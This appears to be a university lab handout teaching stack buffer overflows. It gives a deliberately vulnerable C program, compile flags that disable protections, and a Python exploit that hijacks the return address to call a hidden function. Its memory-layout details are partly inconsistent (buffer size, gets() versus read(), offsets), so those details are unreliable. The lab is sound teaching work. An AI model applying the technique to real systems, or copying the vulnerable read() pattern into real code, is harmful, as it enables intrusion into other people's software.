# Buffer Overflow Lab Activity
## Operating Systems Concepts - Rutgers Camden

---

## Objective
Understand how buffer overflow vulnerabilities work by exploiting a simple C program in a controlled environment, progressing from simple variable corruption to advanced function hijacking.

---

## Background
A **buffer overflow** occurs when a program writes more data to a buffer than it can hold, causing data to overflow into adjacent memory locations. This can:
- Corrupt data
- Crash programs
- Allow attackers to execute arbitrary code
- Change program execution flow

---

## Setup Instructions

### Step 1: Copy the Vulnerable Program
Save the following code as `vulnerable.c`:

```c
#include <stdio.h>
#include <string.h>
#include <unistd.h>

void secret_function() {
    printf("\n🔓 SECRET FUNCTION EXECUTED! 🔓\n");
    printf("This function was NOT supposed to be called!\n");
    printf("The buffer overflow changed the program's execution flow.\n\n");
}

void check_password() {
    char buffer[16];
    int authenticated = 0;
    
    printf("Enter password: ");
    fflush(stdout);
    
    // VULNERABLE: reads more data than buffer can hold!
    read(STDIN_FILENO, buffer, 100);
    
    if (strcmp(buffer, "pass123\n") == 0) {
        authenticated = 1;
    }
    
    if (authenticated) {
        printf("✓ Access granted!\n");
    } else {
        printf("✗ Access denied!\n");
    }
}

int main() {
    printf("=== Buffer Overflow Demonstration ===\n");
    printf("Buffer size: 16 bytes\n\n");
    
    check_password();
    
    printf("Program ending normally.\n");
    return 0;
}
```

### Step 2: Compile the Program

**Important:** We need to disable certain security features for this demonstration.

```bash
gcc -o vulnerable vulnerable.c -fno-stack-protector -z execstack -no-pie -g
```

**Compilation flags explained:**
- `-fno-stack-protector` - Disables stack canaries
- `-z execstack` - Makes stack executable
- `-no-pie` - Disables position independent executable (fixed addresses)
- `-g` - Includes debugging symbols

**Note:** If you get compilation warnings about `gets()`, that's expected - it's warning us about the dangerous function we're intentionally using!

---

## Part 1: Basic Experiments

### Experiment 1: Normal Input (No Overflow)

Run the program and enter a short password:

```bash
./vulnerable
```

Try entering: `hello`

**Expected result:** Access denied, program exits normally.

**What happened:**
- Input fits in the 8-byte buffer
- No overflow occurred
- `authenticated` remains 0
- Program behaves correctly

---

### Experiment 2: Overflow the Buffer (Corrupt Adjacent Variable)

Run the program again:

```bash
./vulnerable
```

Try entering: `AAAAAAAAAAAAAAAA` (16 A's)

**Expected result:** May see strange behavior depending on memory layout.

**What happened:**
- Buffer overflowed with 16 bytes
- May have overwritten the `authenticated` variable
- Program behavior depends on what value ended up in `authenticated`

---

### Experiment 3: Massive Overflow (Program Crash)

Run the program one more time:

```bash
./vulnerable
```

Try entering: `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA` (32 A's or more)

**Expected result:** Segmentation fault (core dumped)
Try 64 A's if the program still runs with 32 A's :)

**What happened:**
- Buffer severely overflowed
- Corrupted critical stack data (saved frame pointer and return address)
- Program tried to return to invalid address (0x41414141 = "AAAA")
- Operating system killed the program for trying to access invalid memory

---

## Understanding the Memory Layout

When `check_password()` is called, the stack looks like this:

```
Higher Memory Addresses
┌────────────────────────┐
│   Return Address       │ ← Where to go after function returns
│   (8 bytes)            │
├────────────────────────┤
│   Saved Frame Pointer  │ ← Saved %rbp register
│   (8 bytes)            │
├────────────────────────┤
│   authenticated = 0    │ ← Integer variable (adjacent to buffer!)
│   (4 bytes + padding)  │
├────────────────────────┤
│   buffer[16]           │ ← Our input goes here
│   (16 bytes)           │
└────────────────────────┘
Lower Memory Addresses
```

When we overflow the buffer:
1. **Small overflow** (12 chars): Overwrites `authenticated`
2. **Medium overflow** (24+ chars): Overwrites saved frame pointer
3. **Large overflow** (32+ chars): Overwrites return address → CRASH!

---

## Extension 1: Using GDB to Examine Memory

### Install GDB (if not already installed)

```bash
# On Ubuntu/WSL
sudo apt-get update
sudo apt-get install gdb

# On Mac
brew install gdb
```

### Start GDB

```bash
gdb ./vulnerable
```

### Set a Breakpoint

```gdb
(gdb) break check_password
(gdb) run
```

When it stops, examine memory:

```gdb
(gdb) info locals
(gdb) print &buffer
(gdb) print &authenticated
(gdb) x/32xb &buffer
```

This shows you the exact memory addresses and how the variables are laid out.

---

## Extension 2: Call secret_function() (Advanced Challenge)

**Objective:** Use buffer overflow to call `secret_function()` without it being called in the code.

This is a more advanced exploitation technique that demonstrates **control flow hijacking** - the most dangerous consequence of buffer overflows.

### Step 1: Find the Address of secret_function

Use the `nm` tool to examine the binary's symbols:

```bash
nm vulnerable | grep secret_function
```

**Example output:**
```
00000000004011b6 T secret_function
```

Your address might be different - use YOUR actual address!

### Step 2: Find a RET Gadget (for Stack Alignment)

x86-64 calling convention requires 16-byte stack alignment. We'll use a simple RET instruction:

```bash
objdump -d vulnerable | grep "ret$" | head -1
```

**Example output:**
```
  40101a:	c3                   	ret
```

### Step 3: Calculate the Offset

To reach the return address, we need to fill:
- Buffer: 16 bytes
- Saved RBP: 8 bytes
- **Total offset: 24 bytes**

### Step 4: Craft the Exploit

Create a Python script called `exploit.py`:

```python
#!/usr/bin/env python3
import sys
import struct

# TODO: Replace these with YOUR addresses from steps 1 & 2!
ret_gadget = 0x40101a        # Your RET gadget address
secret_function = 0x4011b6   # Your secret_function address

# Build the payload
payload  = b'A' * 24  # Fill buffer (16) + saved RBP (8)
payload += struct.pack('<Q', ret_gadget)      # RET for alignment
payload += struct.pack('<Q', secret_function) # Target address

sys.stdout.buffer.write(payload)
```

**Explanation:**
- `b'A' * 24` - Fills the buffer and saved RBP
- `struct.pack('<Q', addr)` - Packs address as 64-bit little-endian
- First address is a RET gadget (for stack alignment)
- Second address is our target function

### Step 5: Run the Exploit

```bash
python3 exploit.py | ./vulnerable
```

**Expected result:**
```
=== Buffer Overflow Demonstration ===
Buffer size: 16 bytes

Enter password: ✗ Access denied!

🔓 SECRET FUNCTION EXECUTED! 🔓
This function was NOT supposed to be called!
The buffer overflow changed the program's execution flow.
```

**Success!** You've hijacked the program's control flow!

### How It Works

1. The buffer overflows with 24 bytes of padding
2. The saved RBP is overwritten with 'AAAAAAAA'
3. The return address is overwritten with the RET gadget address
4. When `check_password()` returns, it jumps to the RET gadget
5. The RET gadget pops the next address (secret_function) into the instruction pointer
6. The CPU begins executing secret_function()!

```
Stack After Overflow:
┌────────────────────────────┐
│ 0x4011b6 (secret_function) │ ← Next return address
├────────────────────────────┤
│ 0x40101a (RET gadget)      │ ← Overwritten return address
├────────────────────────────┤
│ 0x4141414141414141 (AAAA)  │ ← Overwritten saved RBP
├────────────────────────────┤
│ AAAA AAAA AAAA AAAA        │ ← Buffer filled with padding
└────────────────────────────┘
```

---

## Discussion Questions

1. **Why is `read()` with a large size parameter dangerous?**
   - It doesn't check if the input fits in the destination buffer
   - Similar issues with `gets()`, `strcpy()`, `sprintf()`

2. **What are stack canaries and how do they help?**
   - Random values placed before the return address
   - Checked before function returns
   - If changed, program terminates (stack smashing detected)

3. **What is ASLR (Address Space Layout Randomization)?**
   - Randomizes memory addresses at runtime
   - Makes it harder to predict where functions are located
   - Our exploit used fixed addresses (ASLR was disabled with -no-pie)

4. **How can developers prevent buffer overflows?**
   - Use safe functions: `fgets()` instead of `gets()`, `strncpy()` instead of `strcpy()`
   - Check array bounds before writing
   - Use languages with automatic bounds checking (Java, Python, Rust)
   - Enable compiler protections: stack canaries, DEP/NX

5. **Why do these vulnerabilities still exist today?**
   - Legacy code written in C/C++
   - Backwards compatibility requirements
   - Complex codebases with hidden bugs
   - Interaction between different security features

---

## Safe Coding Practices

### Bad (Vulnerable) Code:
```c
char buffer[16];
read(STDIN_FILENO, buffer, 100);  // CAN OVERFLOW!
```

### Good (Safe) Code:
```c
char buffer[16];
ssize_t bytes_read = read(STDIN_FILENO, buffer, sizeof(buffer) - 1);  // Safe!
if (bytes_read > 0) {
    buffer[bytes_read] = '\0';  // Null terminate
}
```

### Other Safe Alternatives:

```c
// Instead of gets()
fgets(buffer, sizeof(buffer), stdin);

// Instead of strcpy()
strncpy(dest, src, sizeof(dest) - 1);
dest[sizeof(dest) - 1] = '\0';

// Instead of sprintf()
snprintf(buffer, sizeof(buffer), "Hello %s", name);
```

---

## Real-World Examples

### Morris Worm (1988)
- First major Internet worm
- Exploited buffer overflow in fingerd daemon
- Infected thousands of computers
- Led to creation of CERT

### Code Red (2001)
- Exploited buffer overflow in Microsoft IIS
- Infected 359,000 computers in 14 hours
- Caused $2.6 billion in damages

### Heartbleed (2014)
- Buffer over-read in OpenSSL
- Allowed reading arbitrary memory
- Affected 17% of secure web servers
- Could leak passwords, private keys

### Modern Bug Bounties
- Google pays up to $150,000 for exploits
- Buffer overflows remain high-value targets
- Understanding attacks helps build defenses

---

## Assessment Rubric

### Basic Level (70 points)
- [ ] Successfully compiled the program (10 pts)
- [ ] Demonstrated normal execution (10 pts)
- [ ] Caused variable corruption (20 pts)
- [ ] Caused segmentation fault (20 pts)
- [ ] Answered discussion questions (10 pts)

### Advanced Level (30 points - Extension 2)
- [ ] Found secret_function address (5 pts)
- [ ] Found RET gadget address (5 pts)
- [ ] Calculated correct offset (5 pts)
- [ ] Created working exploit script (10 pts)
- [ ] Successfully called secret_function() (5 pts)

### Extra Credit (10 points)
- [ ] Used GDB to examine memory corruption (5 pts)
- [ ] Explained exploit mechanism in own words (5 pts)

**Total possible: 110 points (100 base + 10 extra credit)**

---

## Troubleshooting

### "Segmentation fault" immediately
- Check your compilation flags
- Make sure you used `-fno-stack-protector`
- Try shorter input first

### "stack smashing detected"
- Stack canaries are enabled
- Recompile with `-fno-stack-protector`

### Exploit doesn't work (Extension 2)
- Make sure you're using YOUR actual addresses (not examples)
- Check that you have the correct offset (24 bytes)
- Verify little-endian byte order
- Use GDB to debug: `gdb -ex "run < <(python3 exploit.py)" ./vulnerable`

### Different addresses than examples
- This is NORMAL! Addresses vary by system
- Always use `nm` and `objdump` to find YOUR addresses
- Never copy addresses from examples without verification

---

## Submission Requirements

Submit a PDF document containing:

1. **Screenshots** showing:
   - Normal execution (no overflow)
   - Variable corruption (medium overflow)
   - Segmentation fault (large overflow)
   - (Advanced) Calling secret_function()

2. **Written responses** to all discussion questions

3. **(Advanced) Python exploit script** with:
   - Your actual addresses (not examples)
   - Comments explaining each line
   - Screenshot showing successful execution

4. **(Extra Credit) GDB session** showing:
   - Memory addresses of variables
   - Hex dump of buffer before/after overflow
   - Explanation of what you observed

---

## Learning Objectives

By completing this lab, you will:

✅ Understand how buffer overflows corrupt memory  
✅ Recognize dangerous C functions  
✅ Visualize stack memory layout  
✅ Experience control flow hijacking firsthand  
✅ Appreciate modern security defenses  
✅ Learn safe coding practices  

---

## Ethical Considerations

⚠️ **Important:** These techniques should only be used in controlled environments for educational purposes.

**Legal:**
- ✅ Practice on your own systems
- ✅ Use in educational labs
- ✅ Learn for defensive security
- ❌ Never attack systems without permission
- ❌ Unauthorized access is illegal (Computer Fraud and Abuse Act)

**Educational:**
- Understanding attacks → Better defenses
- Knowledge ≠ Intent
- Responsible disclosure of vulnerabilities
- Security research benefits everyone

---

## Additional Resources

### Reading
- "Smashing The Stack For Fun And Profit" - Aleph One (1996)
- OWASP Buffer Overflow Guide
- CWE-120: Buffer Copy without Checking Size of Input

### Videos
- LiveOverflow: "Binary Exploitation / Memory Corruption"
- Computerphile: "Buffer Overflow Attack"

### Practice
- exploit.education
- picoCTF challenges
- Hack The Box

### Tools
- GDB (GNU Debugger)
- objdump (disassembler)
- nm (symbol viewer)
- checksec (security feature checker)

---

## Summary

Buffer overflows remain one of the most critical security vulnerabilities despite being well-understood for decades. They demonstrate:

1. **The importance of input validation** - Never trust user input
2. **Defense in depth** - Multiple layers of protection are needed
3. **Legacy code challenges** - Old vulnerabilities persist in modern systems
4. **The attacker's advantage** - One vulnerability can compromise entire system

By understanding how these attacks work, you become a better programmer and security professional.

**"To defeat your enemy, you must understand them."**

---

## Quick Reference Card

### Compilation
```bash
gcc -o vulnerable vulnerable.c -fno-stack-protector -z execstack -no-pie -g
```

### Test Inputs
| Input Length | Expected Result |
|-------------|-----------------|
| 5 chars | Normal operation |
| 16 chars | May corrupt `authenticated` |
| 32 chars | Segmentation fault |

### Finding Addresses (Extension 2)
```bash
nm vulnerable | grep secret_function
objdump -d vulnerable | grep "ret$" | head -1
```

### Memory Layout
```
[Buffer 16B][Saved RBP 8B][Return Addr 8B]
            ↑              ↑
        Overflow here   Hijack here
```

---

**Version:** 2.0 (Updated with Extension 2)  
**Last Updated:** December 2025  
**Tested On:** Ubuntu 24.04 LTS, WSL2, x86-64  

---

*Good luck and happy (ethical) hacking!* 🔒
